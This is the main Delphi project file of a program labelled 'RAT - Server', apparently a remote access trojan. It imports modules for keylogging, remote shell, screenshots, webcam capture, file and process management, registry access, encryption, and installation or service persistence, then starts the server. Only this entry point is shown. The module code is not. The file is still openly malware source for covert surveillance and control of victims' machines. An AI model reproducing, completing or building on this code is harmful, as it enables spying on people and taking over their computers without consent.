{ RAT - Server }

//{$DEFINE DEMO}
{$IFDEF DEMO}
{$APPTYPE CONSOLE}
{$ENDIF}
uses
  uStructs in 'uStructs.pas',
  uCommands in 'uCommands.pas',
  uParser in 'uParser.pas',
  uFunctions in 'uFunctions.pas',
  uInstallation in 'uInstallation.pas',
  uEncryption in 'uEncryption.pas',
  uFilemanager in 'uFilemanager.pas',
  uProcessmanager in 'uProcessmanager.pas',
  uWindow in 'uWindow.pas',
  uService in 'uService.pas',
  uScreenshot in 'uScreenshot.pas',
  ZLibEx2 in 'ZLibEx2.pas',
  CompressionStreamUnit in 'CompressionStreamUnit.pas',
  uRegistry in 'uRegistry.pas',
  uRemoteShell in 'uRemoteShell.pas',
  CnRawInput in 'CnRawInput.pas',
  uKeyLogger in 'uKeyLogger.pas',
  SocketUnit in 'SocketUnit.pas',
  uCamHelper in 'uCamHelper.pas',
  VFrames in 'Webcam\VFrames.pas',
  VSample in 'Webcam\VSample.pas',
  DirectShow9 in 'Webcam\DirectShow9.pas',
  DirectDraw in 'Webcam\DirectDraw.pas',
  DirectSound in 'Webcam\DirectSound.pas',
  DXTypes in 'Webcam\DXTypes.pas',
  Direct3D9 in 'Webcam\Direct3D9.pas',
  uConnection in 'uConnection.pas',
  fForms in 'Webcam\fForms.pas';

var
  mServer:TServer;
begin
  Application.Initialize;
  mServer := Tserver.Create;
  Application.Run;
end.
